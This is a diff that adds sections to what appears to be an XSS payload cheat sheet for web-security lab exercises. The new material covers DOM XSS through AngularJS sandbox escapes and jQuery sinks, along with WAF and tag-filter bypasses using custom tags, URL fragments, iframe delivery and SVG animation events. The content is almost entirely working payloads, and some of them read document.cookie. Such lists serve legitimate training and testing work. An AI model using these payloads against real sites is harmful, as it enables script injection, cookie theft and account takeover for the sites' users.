@@ -72,7 +72,53 @@ ${alert(0)}
 ```
 
 ---
+# 4. DOM XSS & FRAMEWORKS
 
+-- **_AngularJS Sandbox Escape (Requires `<body ng-app>` attribute)_**
+```javascript
+{{constructor.constructor('alert(1)')()}}
+```
+
+-- **_jQuery 'href' / location sinks_**
+```javascript
+returnPath=javascript:alert(document.cookie);
+```
+
+-- **_jQuery 'hashChange' (Deliver payload via iframe)_**
+```html
+<iframe src="https://<LAB-URL>/#" onload="this.src += '<img src=x onerror=print()>'"></iframe>
+```
+
+-- **_Stored DOM XSS: Poor Sanitization (replace function bypass)_**
+```html
+<><img src=x onerror=alert(0)>
+```
+
+---
+
+# 5. WAF & FILTER BYPASS (BLOCKED TAGS)
+
+-- **_Only specific tags/events allowed (e.g., `<body>` tag and onresize)_**
+```html
+<iframe src="https://<LAB-URL>/?search=<body onresize=print()>" onload=this.style.width='100px'></iframe>
+```
+
+-- **_Custom HTML Tags (When standard tags are blocked)_**
+```html
+<customTag onfocus=alert(document.cookie) tabindex=1 autofocus>
+```
+
+-- **_Custom Tag delivery via URL Fragment (#)_**
+```html
+<script>
+location= 'https://<LAB-URL>/?search=<customTag id=identificador onfocus=alert(document.cookie) tabindex=1>#identificador';
+</script>
+```
+
+-- **_SVG Tags & Events (Test with Intruder to find unblocked ones)_**
+```html
+<svg><animateTransform onbegin=alert(0)>
+```
 
 
 ---
